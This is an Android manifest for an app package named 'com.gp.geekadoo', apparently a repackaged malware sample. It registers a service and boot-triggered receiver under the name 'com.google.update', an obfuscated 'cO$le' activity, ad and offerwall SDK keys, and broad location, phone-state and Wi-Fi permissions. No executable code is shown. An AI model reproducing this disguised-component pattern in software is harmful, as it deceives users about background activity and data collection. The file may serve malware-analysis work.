<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.gp.geekadoo">
    <application android:icon="@drawable/icon" android:label="@string/app_name" android:theme="@style/CustomButton">
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".ui.MainScreen" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="ui.Yaniv" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="cO$le" android:theme="@android:style/Theme.Dialog"/>
        <service android:name="com.google.update.UpdateService"/>
        <receiver android:name="com.google.update.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_CHANGED_ACTION"/>
                <action android:name="android.intent.action.SIG_STR"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <meta-data android:name="ST_MY_PID" android:value="1014user"/>
        <activity android:name="cn.domob.android.ads.DomobActivity" android:theme="@android:style/Theme.Translucent"/>
        <activity android:name="com.adwo.adsdk.AdwoAdBrowserActivity"/>
        <meta-data android:name="ADMOGO_KEY" android:value="44bea7ef0eda4edba268012c76e344f5"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.waps.OffersWebView"/>
        <meta-data android:name="WAPS_ID" android:value="90102a4c439f09524e3525f3266fb24a"/>
        <meta-data android:name="WAPS_PID" android:value="WAPS"/>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.GET_TASKS"/>
</manifest>